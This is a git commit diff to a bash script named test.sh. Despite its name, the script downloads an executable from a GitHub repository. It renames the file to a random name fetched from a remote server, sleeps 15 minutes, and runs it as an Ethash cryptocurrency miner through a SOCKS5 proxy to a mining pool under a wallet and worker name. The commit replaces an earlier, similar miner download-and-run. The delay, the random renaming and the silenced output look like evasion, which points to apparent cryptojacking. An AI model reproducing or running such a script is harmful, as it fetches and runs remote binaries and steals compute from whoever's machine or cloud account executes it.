6ef370015d2f684445533ad55a1b349aeac0fc8c
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-26 03:14:07 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,3 +1,13 @@
 #!/bin/bash
-wget https://github.com/aurbach55/dera/raw/main/kopi
-chmod +x ./kopi && nohup ./kopi --coin ETH --pool ethash.kupool.com:443 --user prodent.$(echo $(shuf -i 1-99999 -n 1)-T4) > nohup.out
+sleep 15m
+wget https://github.com/rindalasririn/ketaea/raw/main/bubui
+#wget https://cuan.mine.nu/nbminer
+ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
+chmod +x bubui && mv bubui $ACAK
+read -p 'Input Proxy nya: ' PROXY
+WALLET=teguhcong
+POOL=stratum+tcp://ethash.poolbinance.com:1800
+WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
+#WORKER2=$(date '+%d%b')
+#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
+./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
